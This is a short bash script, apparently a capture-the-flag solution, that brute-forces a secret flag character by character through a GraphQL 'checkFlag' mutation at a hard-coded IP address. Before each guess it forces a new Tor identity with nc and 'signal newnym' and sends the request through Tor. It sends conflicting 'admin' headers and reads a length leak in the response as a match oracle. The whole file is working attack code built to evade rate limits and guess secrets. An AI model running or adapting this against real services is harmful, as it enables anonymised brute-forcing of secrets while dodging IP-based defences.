#!/bin/bash

known="junior-"
count=$(echo $known | wc -c)
echo "next letter #: $count"
while true
do
  for x in e t a o i n s h r d l u w m f c g y p b k v j x q 0 1 2 3 4 5 6 7 8 9 E T A O I N S H R D L U W M F C G Y P B K V J X Q _ -
  do
    (echo authenticate '""'; echo signal newnym; echo quit) | nc localhost 9151
    sleep 1
    flag=$known$x
    OUT=$(curl 'http://199.247.4.207:4000/' \
         -s --socks5-hostname localhost:9150 \
         -H 'content-type: application/json' \
         -H 'admin: true' -H 'admin: false' \
         --data '{"query":"mutation {checkFlag(flag: \"'$flag'\")}"}')
    echo $OUT
    if echo "$OUT" | grep -q "$count"; then
      echo "$flag -> MATCH!!!!!!"
      known=$flag
      count=$(echo $known | wc -c)
      break
    else
      echo "$flag -> no match"
    fi
  done
done
